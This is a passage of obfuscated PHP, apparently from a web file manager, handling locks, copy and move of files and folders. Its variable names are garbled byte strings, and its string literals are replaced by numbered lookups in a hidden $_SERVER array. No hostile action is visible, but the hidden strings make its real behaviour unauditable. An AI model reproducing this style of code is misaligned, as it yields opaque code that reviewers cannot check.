$this->_lockEvent($ãöóÛàù, array($ş·”áö²[556], $ş·”áö²[557]), $‹Ñå™Áö); $this->_lockParent($ãöóÛàù, array($ş·”áö²[557]), $‹Ñå™Áö); $this->_lockEvent($ãöóÛàù, array($ş·”áö²[558], $ş·”áö²[559]), $‹Ñå™Áö); } public function lockWriteStart($ÈÒŞ¾íı, $§˜ğÕ”â = '') { $Úé÷ =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $this->_lockCheck($Úé÷[556], $ÈÒŞ¾íı); $‘Áş¬òÉ = 1; $this->_lockKey($Úé÷[560] . $ÈÒŞ¾íı . $Úé÷[10] . $§˜ğÕ”â, $‘Áş¬òÉ); $this->_lockEvent($ÈÒŞ¾íı, array($Úé÷[555], $Úé÷[557]), $‘Áş¬òÉ); $this->_lockParent($ÈÒŞ¾íı, array($Úé÷[555], $Úé÷[557]), $‘Áş¬òÉ); $this->_lockCheckEnd($Úé÷[556], $ÈÒŞ¾íı); } public function lockWriteEnd($µ«‹‹ùÔ, $ŞğìºÕ = '') { $õ¡Ëì…´ =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $²Øúá¬“ = 0; $this->_lockKey($õ¡Ëì…´[560] . $µ«‹‹ùÔ . $õ¡Ëì…´[10] . $ŞğìºÕ, $²Øúá¬“); $this->_lockEvent($µ«‹‹ùÔ, array($õ¡Ëì…´[555], $õ¡Ëì…´[557]), $²Øúá¬“); $this->_lockParent($µ«‹‹ùÔ, array($õ¡Ëì…´[555], $õ¡Ëì…´[557]), $²Øúá¬“); } public function lockMoveStart($Ù¤Ï¨½) { $ŠÉ¥˜ù™ =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $this->_lockCheck($ŠÉ¥˜ù™[557], $Ù¤Ï¨½); $ÉÜ„÷Úã = 1; $this->_lockKey($ŠÉ¥˜ù™[561] . $Ù¤Ï¨½, $ÉÜ„÷Úã); $this->_lockEvent($Ù¤Ï¨½, array($ŠÉ¥˜ù™[555], $ŠÉ¥˜ù™[556]), $ÉÜ„÷Úã); $this->_lockParent($Ù¤Ï¨½, array($ŠÉ¥˜ù™[555], $ŠÉ¥˜ù™[557]), $ÉÜ„÷Úã); $this->_lockEvent($Ù¤Ï¨½, array($ŠÉ¥˜ù™[562], $ŠÉ¥˜ù™[558], $ŠÉ¥˜ù™[559]), $ÉÜ„÷Úã); $this->_lockCheckEnd($ŠÉ¥˜ù™[557], $Ù¤Ï¨½); } public function lockMoveEnd($Ò¹Öˆ÷Ò) { $œìµª¡ =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $ªÑ€ù©ø = 0; $this->_lockKey($œìµª¡[561] . $Ò¹Öˆ÷Ò, $ªÑ€ù©ø); $this->_lockEvent($Ò¹Öˆ÷Ò, array($œìµª¡[555], $œìµª¡[556]), $ªÑ€ù©ø); $this->_lockParent($Ò¹Öˆ÷Ò, array($œìµª¡[555], $œìµª¡[557]), $ªÑ€ù©ø); $this->_lockEvent($Ò¹Öˆ÷Ò, array($œìµª¡[562], $œìµª¡[558], $œìµª¡[559]), $ªÑ€ù©ø); } private function _lockCheck($˜²Í²Æ, $îÇÉ¾Áü) { $ÆØ¯–ÔØ =& $_SERVER[ï»»·÷á]; $´¨ã“î£ = $this->sourceInfo($îÇÉ¾Áü); $üÅ¡«Äº = $˜²Í²Æ . $ÆØ¯–ÔØ[10] . $îÇÉ¾Áü; $this->_lockTimeStart[$üÅ¡«Äº] = timeFloat(); if (!is_array($´¨ã“î£)) { return; } $òæ±Ìå¬ = LNG($ÆØ¯–ÔØ[563]); CacheLock::setErrorMsg($ÆØ¯–ÔØ[162] . htmlspecialchars($´¨ã“î£[$ÆØ¯–ÔØ[32]]) . $ÆØ¯–ÔØ[164] . $òæ±Ìå¬); $this->_lockKey($üÅ¡«Äº, 1); $this->_lockKey($üÅ¡«Äº, 0); $–øÕà«Ø = array_reverse($this->parentLevelArray($´¨ã“î£[$ÆØ¯–ÔØ[520]])); foreach ($–øÕà«Ø as $°•Ö³´) { $üÅ¡«Äº = $˜²Í²Æ . $ÆØ¯–ÔØ[564] . $°•Ö³´; if (CacheLock::lockGet($ÆØ¯–ÔØ[565] . $üÅ¡«Äº)) { $´¨ã“î£ = $this->sourceInfo($°•Ö³´); CacheLock::setErrorMsg($ÆØ¯–ÔØ[162] . htmlspecialchars($´¨ã“î£[$ÆØ¯–ÔØ[32]]) . $ÆØ¯–ÔØ[164] . $òæ±Ìå¬); $this->_lockKey($üÅ¡«Äº, 1); $this->_lockKey($üÅ¡«Äº, 0); } } } private function _lockCheckEnd($º‰Çâïù, $Êïöïùà) { $”ÛÂÑÇÂ =& $_SERVER[ï»»·÷á]; $¦©”¿¼Ò = $º‰Çâïù . $”ÛÂÑÇÂ[10] . $Êïöïùà; CacheLock::setErrorMsg($”ÛÂÑÇÂ[378]); if (!isset($this->_lockTimeStart[$¦©”¿¼Ò])) { return; } $åü‚¡’¤ = timeFloat() - $this->_lockTimeStart[$¦©”¿¼Ò]; unset($this->_lockTimeStart[$¦©”¿¼Ò]); if ($åü‚¡’¤ > 0.5) { unset(self::$cacheSourceInfo[$”ÛÂÑÇÂ[469] . $Êïöïùà]); } $—¡©Ïä¡ = $this->sourceInfo($Êïöïùà); if (!$—¡©Ïä¡) { show_json(LNG($”ÛÂÑÇÂ[105]), !1); } } private function _lockParent($èš…Â­¨, $ª¤‰İ·Â, $‘À·™Ì) { if (!$this->autoLockSet) { return; } $âëİ¨Œ = $this->sourceInfo($èš…Â­¨); if (!is_array($âëİ¨Œ)) { return; } $€Œ¯ÑÅ = array_reverse($this->parentLevelArray($âëİ¨Œ[$_SERVER[ï»»·÷á][520]])); foreach ($€Œ¯ÑÅ as $’È‘›¼º) { $this->_lockEvent($’È‘›¼º, $ª¤‰İ·Â, $‘À·™Ì); } } private function _lockEvent($¡¦éúäÈ, $²öô˜”›, $õÅ¶ê‡İ) { $ÆĞáç©Ş =& $_SERVER[ï»»·÷á]; if (!$this->autoLockSet) { return; } foreach ($²öô˜”› as $Õ¡±•ùÃ) { $ØåŞá­Ì = $Õ¡±•ùÃ . $ÆĞáç©Ş[10] . $¡¦éúäÈ; if ($õÅ¶ê‡İ && CacheLock::lockGet($ÆĞáç©Ş[565] . $ØåŞá­Ì)) { continue; } $this->_lockKey($ØåŞá­Ì, $õÅ¶ê‡İ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($áé°ëà, $ééø·Éş = 1) { $¶÷ƒ’ì§ = $_SERVER[ï»»·÷á][565] . md5($áé°ëà); if ($ééø·Éş) { if (isset(self::$_lockItemArr[$¶÷ƒ’ì§])) { return; } self::$_lockItemArr[$¶÷ƒ’ì§] = 1; CacheLock::lock($¶÷ƒ’ì§, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¶÷ƒ’ì§])) { return; } unset(self::$_lockItemArr[$¶÷ƒ’ì§]); CacheLock::unlock($¶÷ƒ’ì§); } } public function isParentOf($è½¯å´, $Æéš¥ÍŞ) { $«Ğ©éÈ„ =& $_SERVER[ï»»·÷á]; $ŸÌÛœ›Õ = $this->sourceInfo($è½¯å´); $ÀƒÓœ¨³ = $this->sourceInfo($Æéš¥ÍŞ); $°ïó½¨½ = $ŸÌÛœ›Õ[$«Ğ©éÈ„[520]] . $ŸÌÛœ›Õ[$«Ğ©éÈ„[411]] . $«Ğ©éÈ„[50]; $–›Ú¸é = $ÀƒÓœ¨³[$«Ğ©éÈ„[520]] . $ÀƒÓœ¨³[$«Ğ©éÈ„[411]] . $«Ğ©éÈ„[50]; $öú‹õÔ = strpos($–›Ú¸é, $°ïó½¨½) === 0; return $öú‹õÔ; } private $targetIsDelete = 0; public function copy($˜“­¤ğ¿, $ÉÚßÛ¹ô, $ˆ–ô™Û× = REPEAT_REPLACE, $åì’óâé = '') { $ğÄİ­¶Õ =& $_SERVER[ï»»·÷á]; $øÁã‡ƒ = $this->sourceInfo($˜“­¤ğ¿); $ßŒÆ¬ÙÒ = $this->sourceInfo($ÉÚßÛ¹ô); if (!$øÁã‡ƒ || !$ßŒÆ¬ÙÒ || $ßŒÆ¬ÙÒ[$ğÄİ­¶Õ[419]] != $ğÄİ­¶Õ[88]) { return !1; } if ($this->isParentOf($˜“­¤ğ¿, $ÉÚßÛ¹ô)) { return !1; } $êäê”ó± = $åì’óâé ? $åì’óâé : $øÁã‡ƒ[$ğÄİ­¶Õ[32]]; $this->lockCopyStart($˜“­¤ğ¿); $this->lockWriteStart($ÉÚßÛ¹ô, $êäê”ó±); $ªßßÖÒä = array($ğÄİ­¶Õ[566] => array(), $ğÄİ­¶Õ[567] => array(), $ğÄİ­¶Õ[568] => array()); $this->targetIsDelete = intval($øÁã‡ƒ[$ğÄİ­¶Õ[440]]); $¡ĞÀÊŒ = $this->fileNameExistCache($ÉÚßÛ¹ô, $øÁã‡ƒ[$ğÄİ­¶Õ[32]]); $ş¸û§•Æ = $this->_copy($˜“­¤ğ¿, $ÉÚßÛ¹ô, $ˆ–ô™Û×, $ªßßÖÒä, !0, $åì’óâé); $this->_childrenListClear(); $this->lockCopyEnd($˜“­¤ğ¿); $this->lockWriteEnd($ÉÚßÛ¹ô, $êäê”ó±); if ($øÁã‡ƒ[$ğÄİ­¶Õ[419]] == $ğÄİ­¶Õ[88] && $¡ĞÀÊŒ == $ş¸û§•Æ) { $this->folderSizeResetChildren($¡ĞÀÊŒ); } Model($ğÄİ­¶Õ[569])->addAll($ªßßÖÒä[$ğÄİ­¶Õ[567]], array(), !0); if ($¡ĞÀÊŒ != $ş¸û§•Æ || $øÁã‡ƒ[$ğÄİ­¶Õ[419]] == $ğÄİ­¶Õ[88]) { Model($ğÄİ­¶Õ[570])->eventCopy($ş¸û§•Æ); } $this->saveAll($ªßßÖÒä[$ğÄİ­¶Õ[568]]); Model($ğÄİ­¶Õ[200])->linkAdd($ªßßÖÒä[$ğÄİ­¶Õ[566]]); $this->folderSizeReset($ÉÚßÛ¹ô); $this->updateModifyTime($ÉÚßÛ¹ô); return $ş¸û§•Æ; } private function _copy($¡éòü€, $îÅå“ÙÆ, $Õ´ƒ¿üï, &$ş®É˜‡£, $šòğ’€Š, $Î„Úç¢Ø = '') { $¤°Ÿö’Ç =& $_SERVER[ï»»·÷á]; $§òØˆÛî = $this->sourceInfoCache($¡éòü€); $¶üĞıÕÏ = $§òØˆÛî[$¤°Ÿö’Ç[419]] == $¤°Ÿö’Ç[88]; $Ğ¯ÙíÙ£ = $Î„Úç¢Ø ? $Î„Úç¢Ø : $§òØˆÛî[$¤°Ÿö’Ç[32]]; $é Ğ°¼¦ = $this->fileNameExistCache($îÅå“ÙÆ, $Ğ¯ÙíÙ£); if ($šòğ’€Š) { $this->_childrenAllMake($¡éòü€); if ($¶üĞıÕÏ && $é Ğ°¼¦) { $this->_childrenAllMake($é Ğ°¼¦); } } if (!$é Ğ°¼¦) { return $this->_copyCreate($¡éòü€, $îÅå“ÙÆ, $Ğ¯ÙíÙ£, $ş®É˜‡£); } $Ò½Ô¼šò = $é Ğ°¼¦; if ($¶üĞıÕÏ) { if ($Õ´ƒ¿üï == REPEAT_RENAME_FOLDER) { $Ğ¯ÙíÙ£ = $this->fileNameAutoCache($îÅå“ÙÆ, $Ğ¯ÙíÙ£, $Õ´ƒ¿üï, $¶üĞıÕÏ); $Ò½Ô¼šò = $this->_copyCreate($¡éòü€, $îÅå“ÙÆ, $Ğ¯ÙíÙ£, $ş®É˜‡£); } else { $’¥ª®Æ = $this->_childrenList($¡éòü€); foreach ($’¥ª®Æ as $…öı™Ñî) { $this->_copy($…öı™Ñî[$¤°Ÿö’Ç[411]], $é Ğ°¼¦, $Õ´ƒ¿üï, $ş®É˜‡£, !1); } } } else { if ($Õ´ƒ¿üï == REPEAT_RENAME || $Õ´ƒ¿üï == REPEAT_RENAME_FOLDER) { $Ğ¯ÙíÙ£ = $this->fileNameAutoCache($îÅå“ÙÆ, $Ğ¯ÙíÙ£, $Õ´ƒ¿üï, $¶üĞıÕÏ); $Ò½Ô¼šò = $this->_copyCreate($¡éòü€, $îÅå“ÙÆ, $Ğ¯ÙíÙ£, $ş®É˜‡£); } else { if ($Õ´ƒ¿üï == REPEAT_REPLACE) { $™ªØî¿Ğ = $this->sourceInfoCache($é Ğ°¼¦); $â¿¬èé = $this->fileHistory($™ªØî¿Ğ, $§òØˆÛî[$¤°Ÿö’Ç[477]], $§òØˆÛî[$¤°Ÿö’Ç[76]]); if ($â¿¬èé) { $ş®É˜‡£[$¤°Ÿö’Ç[566]][] = $§òØˆÛî[$¤°Ÿö’Ç[477]]; } } else { if ($Õ´ƒ¿üï == REPEAT_SKIP) { } } } Hook::trigger($¤°Ÿö’Ç[571], array($¤°Ÿö’Ç[572], $§òØˆÛî, 0)); } return $Ò½Ô¼šò; } private function _copyCreate($‹û¨áƒ†, $ã¹¢‘«¦, $£ßğïæŒ, &$Ş°õïÌ•) { $ÓÒ¿®Ç´ =& $_SERVER[ï»»·÷á]; $ìéÆï = $this->sourceInfoCache($‹û¨áƒ†); $Í‡È¸ê£ = $this->sourceInfoCache($ã¹¢‘«¦); $ñš·¬ƒß = $this->_makeItemData($ìéÆï, $Í‡È¸ê£, $£ßğïæŒ); Hook::trigger($ÓÒ¿®Ç´[573], $ñš·¬ƒß); Hook::trigger($ÓÒ¿®Ç´[574], array($ÓÒ¿®Ç´[575], $ñš·¬ƒß, 0)); $¥ª±Ùë— = $this->add($ñš·¬ƒß); $¥îñ°Á = array($ÓÒ¿®Ç´[411] => $¥ª±Ùë—, $ÓÒ¿®Ç´[32] => $£ßğïæŒ); $this->_copyApplyMeta($¥îñ°Á, $Ş°õïÌ•); if ($ìéÆï[$ÓÒ¿®Ç´[419]] != $ÓÒ¿®Ç´[88]) { $Ş°õïÌ•[$ÓÒ¿®Ç´[566]][] = $ìéÆï[$ÓÒ¿®Ç´[477]]; return $¥ª±Ùë—; } $½ƒÑ¢¬ë = array(); $¬²„ãÜ  = array(); $this->_childrenListAll($‹û¨áƒ†, $½ƒÑ¢¬ë); $óÒ«œ = count($½ƒÑ¢¬ë); if ($óÒ«œ == 0) { return $¥ª±Ùë—; } $Æ÷›Ú˜Œ = $this->sourceInfo($¥ª±Ùë—); foreach ($½ƒÑ¢¬ë as $ïòøò¶ö) { $Š¤Õ·‘ = $this->_makeItemData($ïòøò¶ö, $Æ÷›Ú˜Œ, $ïòøò¶ö[$ÓÒ¿®Ç´[32]]); $Š¤Õ·‘[$ÓÒ¿®Ç´[520]] = $ïòøò¶ö[$ÓÒ¿®Ç´[520]]; $¬²„ãÜ [] = $Š¤Õ·‘; } $this->chunkEventSet($ÓÒ¿®Ç´[576], array($ÓÒ¿®Ç´[577], $ñš·¬ƒß, $óÒ«œ)); $this->addAll($¬²„ãÜ , array(), !1); $®íşÍ£ = $this->where(array($ÓÒ¿®Ç´[441] => $¥ª±Ùë—))->select(); $‡Ä¡Â±ˆ = $this->_childrenMakeRelation($½ƒÑ¢¬ë, $®íşÍ£); $‡Ä¡Â±ˆ[$‹û¨áƒ†] = $¥ª±Ùë—; $´ÜùÉòü = array(); $ŞçœÚ = array(); foreach ($®íşÍ£ as $ïòøò¶ö) { $“¢ö´í = $ïòøò¶ö[$ÓÒ¿®Ç´[411]]; $Ñúìñà = $this->_childrenMatch($‡Ä¡Â±ˆ, $ïòøò¶ö, $Æ÷›Ú˜Œ); $´ÜùÉòü[] = array($ÓÒ¿®Ç´[411], $“¢ö´í, $ÓÒ¿®Ç´[441], $Ñúìñà[$ÓÒ¿®Ç´[441]]); $ŞçœÚ[] = array($ÓÒ¿®Ç´[411], $“¢ö´í, $ÓÒ¿®Ç´[520], $Ñúìñà[$ÓÒ¿®Ç´[520]]); $this->_copyApplyMeta($ïòøò¶ö, $Ş°õïÌ•); if ($ïòøò¶ö[$ÓÒ¿®Ç´[419]] != $ÓÒ¿®Ç´[88]) { $Ş°õïÌ•[$ÓÒ¿®Ç´[566]][] = $ïòøò¶ö[$ÓÒ¿®Ç´[477]]; } } $this->chunkEventSet($ÓÒ¿®Ç´[578], array($ÓÒ¿®Ç´[579], $ñš·¬ƒß, $óÒ«œ)); $this->saveAll($´ÜùÉòü); $this->chunkEventSet($ÓÒ¿®Ç´[580], array($ÓÒ¿®Ç´[581], $ñš·¬ƒß, $óÒ«œ)); $this->saveAll($ŞçœÚ); return $¥ª±Ùë—; } private function _childrenMakeRelation($œË¿Ğî², $üëÜÁú¤) { $ş”ç®Ûä =& $_SERVER[ï»»·÷á]; $ÜÃ‰ØË = array(); $€Ä›¨´ = array(); foreach ($œË¿Ğî² as $üİ‰Ö) { $³×€éóš = $üİ‰Ö[$ş”ç®Ûä[32]] . $ş”ç®Ûä[8] . $üİ‰Ö[$ş”ç®Ûä[520]]; $ÜÃ‰ØË[$³×€éóš] = $üİ‰Ö[$ş”ç®Ûä[411]]; } foreach ($üëÜÁú¤ as $üİ‰Ö) { $³×€éóš = $üİ‰Ö[$ş”ç®Ûä[32]] . $ş”ç®Ûä[8] . $üİ‰Ö[$ş”ç®Ûä[520]]; $‘ò†Û = $ÜÃ‰ØË[$³×€éóš]; $€Ä›¨´[$‘ò†Û] = $üİ‰Ö[$ş”ç®Ûä[411]]; } return $€Ä›¨´; } private function _childrenMatch($Ñ•£·É, $îÕóÏÃÄ, $æØş›×) { $òÚöãÜ =& $_SERVER[ï»»·÷á]; $Ÿş¿Ù› = $æØş›×[$òÚöãÜ[520]]; $Ò ¢¥š« = $this->parentLevelArray($îÕóÏÃÄ[$òÚöãÜ[520]]); foreach ($Ò ¢¥š« as $öòÓí“à) { if (isset($Ñ•£·É[$öòÓí“à])) { $Ÿş¿Ù› .= $Ñ•£·É[$öòÓí“à] . $òÚöãÜ[582]; } } $Ÿş¿Ù› = rtrim($Ÿş¿Ù›, $òÚöãÜ[50]) . $òÚöãÜ[50]; $¶¼ÒŒ¦– = $this->parentLevelArray($Ÿş¿Ù›); $µºêÏ¾é = $¶¼ÒŒ¦–[count($¶¼ÒŒ¦–) - 1]; return array($òÚöãÜ[441] => $µºêÏ¾é, $òÚöãÜ[520] => $Ÿş¿Ù›); } private function _makeItemData($¸ĞŒ±§, $®œ‰ôŞ, $”ÂõîŠ—) { $Ç‚²İÌ« =& $_SERVER[ï»»·÷á]; $÷òğ˜§ = array($Ç‚²İÌ«[583] => $¸ĞŒ±§[$Ç‚²İÌ«[419]], $Ç‚²İÌ«[429] => $”ÂõîŠ—, $Ç‚²İÌ«[584] => $¸ĞŒ±§[$Ç‚²İÌ«[421]] ? $¸ĞŒ±§[$Ç‚²İÌ«[421]] : $Ç‚²İÌ«[12], $Ç‚²İÌ«[478] => $¸ĞŒ±§[$Ç‚²İÌ«[477]] ? $¸ĞŒ±§[$Ç‚²İÌ«[477]] : 0, $Ç‚²İÌ«[554] => $¸ĞŒ±§[$Ç‚²İÌ«[76]] ? $¸ĞŒ±§[$Ç‚²İÌ«[76]] : 0, $Ç‚²İÌ«[585] => intval($®œ‰ôŞ[$Ç‚²İÌ«[420]]), $Ç‚²İÌ«[586] => intval($®œ‰ôŞ[$Ç‚²İÌ«[505]]), $Ç‚²İÌ«[587] => intval(USER_ID), $Ç‚²İÌ«[588] => intval(USER_ID), $Ç‚²İÌ«[410] => intval($®œ‰ôŞ[$Ç‚²İÌ«[411]]), $Ç‚²İÌ«[589] => $®œ‰ôŞ[$Ç‚²İÌ«[520]] . $®œ‰ôŞ[$Ç‚²İÌ«[411]] . $Ç‚²İÌ«[50], $Ç‚²İÌ«[433] => $¸ĞŒ±§[$Ç‚²İÌ«[85]] ? $¸ĞŒ±§[$Ç‚²İÌ«[85]] : time(), $Ç‚²İÌ«[439] => 0, $Ç‚²İÌ«[590] => $Ç‚²İÌ«[12]); return $÷òğ˜§; } private function _copyApplyMeta($Ó÷’×†µ, &$›ñØ¤¹¹) { $àÁùËÊ =& $_SERVER[ï»»·÷á]; $¯Š¦ò–Ÿ = $Ó÷’×†µ[$àÁùËÊ[411]]; $şËí•ìÏ = $Ó÷’×†µ[$àÁùËÊ[32]]; if (!isset($Ó÷’×†µ[$àÁùËÊ[591]]) || !$Ó÷’×†µ[$àÁùËÊ[591]] || $Ó÷’×†µ[$àÁùËÊ[591]] == $àÁùËÊ[198]) { $›ñØ¤¹¹[$àÁùËÊ[568]][] = array($àÁùËÊ[411], $¯Š¦ò–Ÿ, $àÁùËÊ[591], short_id($¯Š¦ò–Ÿ)); } if (Input::check($şËí•ìÏ, $àÁùËÊ[592])) { $›ñØ¤¹¹[$àÁùËÊ[567]][] = array($àÁùËÊ[411] => $¯Š¦ò–Ÿ, $àÁùËÊ[94] => $àÁùËÊ[474], $àÁùËÊ[374] => str_replace($àÁùËÊ[53], $àÁùËÊ[12], Pinyin::get($şËí•ìÏ))); $›ñØ¤¹¹[$àÁùËÊ[567]][] = array($àÁùËÊ[411] => $¯Š¦ò–Ÿ, $àÁùËÊ[94] => $àÁùËÊ[473], $àÁùËÊ[374] => Pinyin::get($şËí•ìÏ, $àÁùËÊ[593])); } $›ñØ¤¹¹[$àÁùËÊ[567]][] = array($àÁùËÊ[411] => $¯Š¦ò–Ÿ, $àÁùËÊ[94] => $àÁùËÊ[453], $àÁùËÊ[374] => KodSort::makeStr($şËí•ìÏ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¢ëÏ¤ı„) { $ŠŠ†ì£ç =& $_SERVER[ï»»·÷á]; $ĞüÕåƒÍ = $this->sourceInfo($¢ëÏ¤ı„); $¢Œ³Äêû = $ŠŠ†ì£ç[594]; $õ³²ä¶Ã = array($ŠŠ†ì£ç[520] => array($ŠŠ†ì£ç[549], $ĞüÕåƒÍ[$ŠŠ†ì£ç[520]] . $¢ëÏ¤ı„ . $ŠŠ†ì£ç[550]), $ŠŠ†ì£ç[440] => $this->targetIsDelete); $¬¾Õùñò = $this->field($¢Œ³Äêû)->where($õ³²ä¶Ã)->select(); if (!$¬¾Õùñò) { return; } $¬¾Õùñò = array_to_keyvalue($¬¾Õùñò, $ŠŠ†ì£ç[411]); foreach ($¬¾Õùñò as $ÃŸ¶¥ğÃ) { $í»Îòû = $ÃŸ¶¥ğÃ[$ŠŠ†ì£ç[441]]; $¢ëÏ¤ı„ = $ÃŸ¶¥ğÃ[$ŠŠ†ì£ç[411]]; if (!isset($this->_childrenListCache[$¢ëÏ¤ı„]) && $ÃŸ¶¥ğÃ[$ŠŠ†ì£ç[419]] == $ŠŠ†ì£ç[88]) { $this->_childrenListCache[$¢ëÏ¤ı„] = array(); } if (!isset($this->_childrenListCache[$í»Îòû])) { $this->_childrenListCache[$í»Îòû] = array(); } $this->_childrenListCache[$í»Îòû][$¢ëÏ¤ı„] = $ÃŸ¶¥ğÃ; $this->_childrenItemCache[$¢ëÏ¤ı„] = $ÃŸ¶¥ğÃ; } } private function _childrenListAll($ùİ„®ÙÁ, &$íşïæ¹) { $‰¨…öÄ =& $_SERVER[ï»»·÷á]; if (!isset($this->_childrenListCache[$ùİ„®ÙÁ])) { return; } $ûÕÊ½÷Å = $this->_childrenListCache[$ùİ„®ÙÁ]; foreach ($ûÕÊ½÷Å as $æã‡œç‘ => $ˆÛñºÙ) { $íşïæ¹[$æã‡œç‘] = $ˆÛñºÙ; if ($ˆÛñºÙ[$‰¨…öÄ[419]] == $‰¨…öÄ[88]) { $this->_childrenListAll($æã‡œç‘, $íşïæ¹); } } } private function sourceInfoCache($àÓ”Ø—Ô) { if (isset($this->_childrenItemCache[$àÓ”Ø—Ô])) { return $this->_childrenItemCache[$àÓ”Ø—Ô]; } return $this->sourceInfo($àÓ”Ø—Ô); } private function _childrenList($ØşûªŸß) { if (isset($this->_childrenListCache[$ØşûªŸß])) { return $this->_childrenListCache[$ØşûªŸß]; } return $this->_childrenListSelect($ØşûªŸß); } private function _childrenListSelect($‡³Ê«Ñ§) { $­¿´ˆó =& $_SERVER[ï»»·÷á]; $´Úû›Ã× = array($­¿´ˆó[441] => $‡³Ê«Ñ§, $­¿´ˆó[440] => $this->targetIsDelete); $‡üµÒé¬ = $this->where($´Úû›Ã×)->select(); $‡üµÒé¬ = $‡üµÒé¬ ? $‡üµÒé¬ : array(); $õ´àÊâŸ = array_to_keyvalue($‡üµÒé¬, $­¿´ˆó[411]); $this->_childrenListCache[$‡³Ê«Ñ§] = $õ´àÊâŸ; foreach ($õ´àÊâŸ as $‡³Ê«Ñ§ => $Š¶øÎ’Ë) { $this->_childrenItemCache[$‡³Ê«Ñ§] = $Š¶øÎ’Ë; } return $õ´àÊâŸ; } private function fileNameExistCache($Äø›£ã, $±à—§—‹) { $ı§Ü³ú =& $_SERVER[ï»»·÷á]; $±à—§—‹ = strtolower($±à—§—‹); $³ª¶Ğèû = $this->_childrenList($Äø›£ã); foreach ($³ª¶Ğèû as $à¤Ûòí‰) { if ($±à—§—‹ == strtolower($à¤Ûòí‰[$ı§Ü³ú[32]])) { return $à¤Ûòí‰[$ı§Ü³ú[411]]; } } return !1; } private function fileNameAutoCache($Æ´œ‘È¸, $üØÏê©°, $ÖØÚ§á“, $´Â­¢) { $éÊÆ»Óş =& $_SERVER[ï»»·÷á]; $‚ªú¥ŒÆ = $this->_childrenList($Æ´œ‘È¸); $î‘ˆŞîÂ = array_to_keyvalue($‚ªú¥ŒÆ, $éÊÆ»Óş[12], $éÊÆ»Óş[32]); return $this->fileNameAutoGet($î‘ˆŞîÂ, $üØÏê©°, $ÖØÚ§á“, $´Â­¢); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($†¨èæÙ, $ôå÷›Ñ¢, $²ÇşÔÊ¤ = REPEAT_REPLACE, $‰ƒÍ®ï = '') { $ÏÎŞ¤Øó =& $_SERVER[ï»»·÷á]; $˜¯ú§÷§ = $this->sourceInfo($†¨èæÙ); $¯½¶šîª = $this->sourceInfo($ôå÷›Ñ¢); if ($˜¯ú§÷§[$ÏÎŞ¤Øó[441]] == $¯½¶šîª[$ÏÎŞ¤Øó[411]]) { if ($˜¯ú§÷§[$ÏÎŞ¤Øó[440]] == $ÏÎŞ¤Øó[88]) { Model($ÏÎŞ¤Øó[438])->restore(array($†¨èæÙ)); } if (!$‰ƒÍ®ï || $‰ƒÍ®ï == $˜¯ú§÷§[$ÏÎŞ¤Øó[32]]) { return $†¨èæÙ; } } $Á¹üé˜™ = $this->pathInfoMore($†¨èæÙ); if ($this->isParentOf($†¨èæÙ, $ôå÷›Ñ¢)) { return !1; } if (!$˜¯ú§÷§ || !$¯½¶šîª || $¯½¶šîª[$ÏÎŞ¤Øó[419]] != $ÏÎŞ¤Øó[88]) { return !1; } Hook::trigger($ÏÎŞ¤Øó[595], $Á¹üé˜™); $this->targetIsDelete = intval($˜¯ú§÷§[$ÏÎŞ¤Øó[440]]); if ($˜¯ú§÷§[$ÏÎŞ¤Øó[441]] == $ôå÷›Ñ¢ && $‰ƒÍ®ï != $˜¯ú§÷§[$ÏÎŞ¤Øó[32]]) { $ÜÙåËòˆ = $this->fileNameExist($ôå÷›Ñ¢, $‰ƒÍ®ï); if ($ÜÙåËòˆ && $˜¯ú§÷§[$ÏÎŞ¤Øó[419]] == $ÏÎŞ¤Øó[198]) { $Õ€¸Ö¥ = $this->sourceInfo($ÜÙåËòˆ); $Ñ¼È›Ãú = $this->fileHistory($Õ€¸Ö¥, $˜¯ú§÷§[$ÏÎŞ¤Øó[477]], $˜¯ú§÷§[$ÏÎŞ¤Øó[76]]); if (!$Ñ¼È›Ãú) { Model($ÏÎŞ¤Øó[480])->remove($˜¯ú§÷§[$ÏÎŞ¤Øó[477]]); } $this->removeNow($†¨èæÙ, !1); $this->folderSizeReset($ôå÷›Ñ¢); Hook::trigger($ÏÎŞ¤Øó[596], $Á¹üé˜™); return $ÜÙåËòˆ; } } $„ç“Ã†‹ = $‰ƒÍ®ï ? $‰ƒÍ®ï : $˜¯ú§÷§[$ÏÎŞ¤Øó[32]]; $this->lockMoveStart($†¨èæÙ); $this->lockWriteStart($ôå÷›Ñ¢, $„ç“Ã†‹); $âßëÙ‘Ë = array($ÏÎŞ¤Øó[566] => array(), $ÏÎŞ¤Øó[597] => !1); $this->clearShare($†¨èæÙ, $ôå÷›Ñ¢); $¨ïÑÚ«¹ = $this->fileNameExistCache($ôå÷›Ñ¢, $˜¯ú§÷§[$ÏÎŞ¤Øó[32]]); $Øƒ‚¡º˜ = $this->_move($†¨èæÙ, $ôå÷›Ñ¢, $²ÇşÔÊ¤, $âßëÙ‘Ë, $‰ƒÍ®ï); $this->sourceCacheClear(); if ($˜¯ú§÷§[$ÏÎŞ¤Øó[419]] == $ÏÎŞ¤Øó[88] && $¨ïÑÚ«¹) { $this->folderSizeResetChildren($Øƒ‚¡º˜); } Model($ÏÎŞ¤Øó[200])->linkAdd($âßëÙ‘Ë[$ÏÎŞ¤Øó[566]]); if ($¨ïÑÚ«¹ && $âßëÙ‘Ë[$ÏÎŞ¤Øó[597]]) { $this->removeNow($†¨èæÙ, !1); } $this->lockMoveEnd($†¨èæÙ); $this->lockWriteEnd($ôå÷›Ñ¢, $„ç“Ã†‹); $this->folderSizeReset($˜¯ú§÷§[$ÏÎŞ¤Øó[441]]); $this->folderSizeReset($ôå÷›Ñ¢); $ö€àŒúÎ = array($˜¯ú§÷§[$ÏÎŞ¤Øó[441]], $ôå÷›Ñ¢); if ($˜¯ú§÷§[$ÏÎŞ¤Øó[419]] == $ÏÎŞ¤Øó[88]) { $ö€àŒúÎ[] = $†¨èæÙ; } $this->updateModifyTime($ö€àŒúÎ); Model($ÏÎŞ¤Øó[570])->eventMove($†¨èæÙ, 